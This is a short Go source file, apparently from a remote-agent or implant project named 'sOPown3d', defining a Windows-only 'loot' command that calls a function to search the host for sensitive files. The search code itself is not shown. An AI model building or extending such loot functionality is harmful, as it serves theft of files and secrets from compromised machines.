//go:build windows
// +build windows

package agent

import (
	"log"
	"sOPown3d/internal/agent/commands"
)

func executeLootCommand() string {
	log.Println("💰 Executing loot command...")
	return commands.SearchSensitiveFiles()
}
